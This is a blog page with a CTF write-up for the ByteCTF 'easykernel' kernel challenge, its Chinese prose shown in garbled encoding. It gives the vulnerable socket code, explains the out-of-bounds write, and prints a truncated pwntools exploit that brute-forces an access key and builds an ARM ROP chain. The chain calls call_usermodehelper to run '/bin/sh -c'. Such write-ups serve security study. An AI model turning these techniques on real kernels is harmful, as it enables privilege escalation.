<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æˆ‘çš„åšå®¢">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="æˆ‘çš„åšå®¢">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">bytectf easykernel å¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-09-30 19:47:01 / ä¿®æ”¹æ—¶é—´ï¼š19:48:16" itemprop="dateCreated datePublished" datetime="2022-09-30T19:47:01+08:00">2022-09-30</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="bytectf-easykernel-å¤ç°"><a href="#bytectf-easykernel-å¤ç°" class="headerlink" title="bytectf easykernel å¤ç°"></a>bytectf easykernel å¤ç°</h1><p>å­¦é•¿å‡ºçš„é¢˜ï¼Œåœ¨æ¯”èµ›ä¸­ç”±äºæ²¡æœ‰æ¥è§¦è¿‡å†…æ ¸socketå’ŒarmæŒ‡ä»¤é›†ï¼Œç„¶åå†åŠ ä¸Šidaåæ±‡ç¼–å‡ºæ¥çš„ä»£ç éå¸¸æŠ½è±¡ï¼Œçœ‹ä¸æ¸…æ¥šé€»è¾‘ï¼Œæ‰€ä»¥ç›´åˆ°æ¯”èµ›ç»“æŸéƒ½æ²¡æœ‰æ‰¾è§æ´åœ¨å“ªé‡Œï¼Œèœçš„ç¦»è°±ğŸ¤¦â€â™€ï¸ã€‚åªèƒ½åœ¨èµ›åå¤ç°å¤ç°è¿™æ ·å­äº†ã€‚</p>
<h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>èµ›åå°±å‘å­¦é•¿è¦åˆ°äº†æºç ï¼Œçœ‹æºç çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªè¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥æº¢å‡ºå†™ï¼Œä½†æ˜¯ç®¡é“æ¯æ¬¡ç”³è¯·åˆ°çš„å †å—çš„åç§»ä¸æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ä¸å¥½åˆ©ç”¨ï¼Œå½“æ—¶æ²¡æ³¨æ„åˆ°popçš„æ—¶å€™ä¸ä¼šæ¸…é™¤æ ‡å¿—ä½ï¼Œç»è¿‡å­¦é•¿æç¤ºæ‰æ³¨æ„åˆ°ï¼Œé‚£ä»è¿™ä¸ªè§’åº¦å°±å¥½åˆ©ç”¨å¤šäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">0x2000</span> &amp;&amp; cnt &amp;&amp; cnt &lt; <span class="number">0x10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            recv(buf, len, csock);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">block_struct</span> *<span class="title">blk</span> =</span> &amp;bpipe.blks[(bpipe.pos - <span class="number">1</span>) &amp; <span class="number">0x0f</span>];</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0x1000</span> - blk-&gt;tail;</span><br><span class="line">            <span class="keyword">if</span> (blk-&gt;can_merge &amp;&amp; left &gt;= len - <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                blk-&gt;tail = <span class="number">0x2000</span> - len;</span><br><span class="line">                <span class="built_in">memcpy</span>(blk-&gt;blk + blk-&gt;tail, buf, left);</span><br><span class="line">                push_bpipe_data(buf + (len - <span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0</span>, PUREDATA_BLK);</span><br><span class="line">                reply(<span class="string">&quot;[+] create pure data success!\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;[+] create pure data success!\n&quot;</span>), csock);</span><br><span class="line">                bfree(buf);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>å°±æ˜¯åˆ©ç”¨serverçš„<code>0x20</code>é€‰é¡¹æ¥å¡æ»¡ç®¡é“ï¼Œè¿™é‡Œé¢å°±æœ‰<code>can_merge=1</code>çš„ç®¡é“äº†ï¼Œç„¶ååœ¨å…¨éƒ¨<code>pop</code>å‡ºæ¥ï¼Œå†push<code>0x10</code>æƒé™ï¼Œå°±å¯ä»¥è®©<code>0x10</code>çš„çš„ç®¡é“çš„<code>can_merge=1</code>,ç„¶åå°±å¯ä»¥è¶Šç•Œè¯»å’Œè¶Šç•Œå†™äº†ã€‚æœ€åå†™<code>*callback_func</code>æŒ‡é’ˆæ¥å®Œæˆropã€‚</p>
<p>å¯æ˜¯è¿™æ˜¯å†…æ ¸socketä¸åƒä¸€èˆ¬çš„å†…æ ¸é¢˜å¯ä»¥ä¼ ä¸€ä¸ªç¨‹åºä¸Šå»ï¼Œè¿™è¯¥å¦‚ä½•ropå‘¢ï¼Œå­¦é•¿çš„expç»™äº†ä¸€ä¸ªæ€è·¯ï¼Œå†…æ ¸ä¸­æä¾›äº†ä¸€ä¸ª<code>call_usermodehelper</code>å‡½æ•°ï¼Œå…è®¸åœ¨å†…æ ¸æ€æ‰§è¡Œä¸€ä¸ªç”¨æˆ·æ€çš„ç¨‹åºï¼Œè€Œä¸”å‚æ•°æ¥å£å’Œç”¨æˆ·æ€çš„exec()ç³»åˆ—å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç¨‹åºåï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡é’ˆæ•°ç»„ï¼Œå­˜å‚¨ç€æ‰§è¡Œè¿™ä¸ªç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°ã€‚</p>
<p>æ‰€ä»¥åªè¦ropèƒ½å¤Ÿ1æ§åˆ¶<code>r0</code>å’Œ<code>r1</code>ç„¶åè®©<code>pc=</code>call_usermodehelperå°±å¥½äº†ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦ropå°±å¾—æ§åˆ¶sp,è®©spæŒ‡å‘æˆ‘ä»¬ç²¾å¿ƒå¸ƒç½®çš„å †å—ä¸Šï¼Œè¿™å…¶å®ç›´æ¥ç ´åäº†ç¨‹åºçš„ä¸Šä¸‹æ–‡ï¼Œå½“æ‰§è¡Œå®Œ<code>call_usermodehelper</code>å†ä»æ ˆä¸­å¯»æ‰¾ä¸Šä¸‹æ–‡æ¢å¤åˆ°åŸæ¥è°ƒç”¨å¤„å°±ä¼šå¤±è´¥ï¼Œæ‰€ä»¥ropé¦–å…ˆå¾—ä¿å­˜æ­£å¸¸çš„<code>sp</code>åœ°å€ï¼Œç„¶åå†æ ˆè¿ç§»ï¼Œæœ€åå†æ¢å¤<code>sp</code>ã€‚</p>
<p>æ‰€ä»¥å¯¹gadgetçš„å¯»æ‰¾è¿˜æ˜¯æœ‰ç‚¹è‹›åˆ»çš„ï¼Œæˆ‘è§‰å¾—ä¸æ˜¯å¾ˆå¥½æ‰¾ï¼Œå½“æŒ‰ç€å­¦é•¿çš„gadgetå¤ç°å®Œä¹‹åï¼Œå°è¯•è‡ªå·±åœ¨æ‰¾è§ä¸€å¥—gadget,æœ€åæˆåŠŸç®€åŒ–äº†ä¸€äº›å­¦é•¿çš„gadgetã€‚</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>gadgetæœªç®€åŒ–ç‰ˆ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(save_sp+heap),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0</span>),stack+<span class="number">4</span>*<span class="number">12</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span 